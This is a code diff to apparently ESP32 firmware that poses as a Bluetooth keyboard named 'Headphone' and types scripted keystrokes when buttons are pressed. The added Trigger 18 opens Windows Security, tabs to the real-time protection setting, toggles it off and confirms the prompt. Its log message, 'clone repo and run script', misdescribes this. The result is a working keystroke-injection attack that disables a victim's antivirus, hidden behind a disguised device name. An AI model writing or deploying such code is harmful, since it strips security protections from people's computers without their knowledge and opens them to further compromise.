@@ -19,6 +19,7 @@
 #define BUTTON_15_PIN 22  // Trigger 15
 #define BUTTON_16_PIN 11  // Trigger 16
 #define BUTTON_17_PIN 27  // Trigger 17
+#define BUTTON_18_PIN 20  // Trigger 18
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -41,6 +42,7 @@ bool lastState14 = HIGH;
 bool lastState15 = HIGH;
 bool lastState16 = HIGH;
 bool lastState17 = HIGH;
+bool lastState18 = HIGH;
 
 // helper to type a string char-by-char
 void sendString(const char* s, int charDelay = 10) {
@@ -78,6 +80,7 @@ void setup() {
   pinMode(BUTTON_15_PIN, INPUT_PULLUP);
   pinMode(BUTTON_16_PIN, INPUT_PULLUP);
   pinMode(BUTTON_17_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_18_PIN, INPUT_PULLUP);
 
   bleKeyboard.begin();
 }
@@ -101,6 +104,7 @@ void loop() {
     bool state15 = digitalRead(BUTTON_15_PIN);
     bool state16 = digitalRead(BUTTON_16_PIN);
     bool state17 = digitalRead(BUTTON_17_PIN);
+    bool state18 = digitalRead(BUTTON_18_PIN);
 
     // Trigger 1:
     if (lastState1 == HIGH && state1 == LOW) {
@@ -544,6 +548,53 @@ void loop() {
       delay(1000);
     }
 
+    // Trigger 18:
+    if (lastState18 == HIGH && state18 == LOW) {
+      Serial.println("Trigger 18: clone repo and run script");
+
+      // Open start / Windows menu
+      bleKeyboard.press(KEY_LEFT_GUI);
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(500);
+
+      // type "virus & threat protection"
+      bleKeyboard.print("virus & threat protection");
+      delay(7000);
+      bleKeyboard.releaseAll();
+
+      // press TAB 4 times
+      for (int i = 0; i < 4; ++i) {
+        bleKeyboard.press(KEY_TAB);
+        delay(100);
+        bleKeyboard.releaseAll();
+        delay(700);
+      }
+
+      // press ENTER
+      bleKeyboard.press(KEY_RETURN);
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(1000);
+
+      // === Press SPACE ===
+      bleKeyboard.press(' ');
+      delay(100);
+      bleKeyboard.release(' '); 
+      delay(2000);
+
+      // move left, then press enter
+      bleKeyboard.press(KEY_LEFT_ARROW);
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(100);
+      bleKeyboard.press(KEY_RETURN);
+      delay(100);
+      bleKeyboard.releaseAll();
+      delay(5000);
+      }
+
+
     // update last states
     lastState1 = state1;
     lastState2 = state2;
@@ -562,6 +613,7 @@ void loop() {
     lastState15 = state15;
     lastState16 = state16;
     lastState17 = state17;
+    lastState18 = state18;
   }
 
   delay(10); // Small debounce
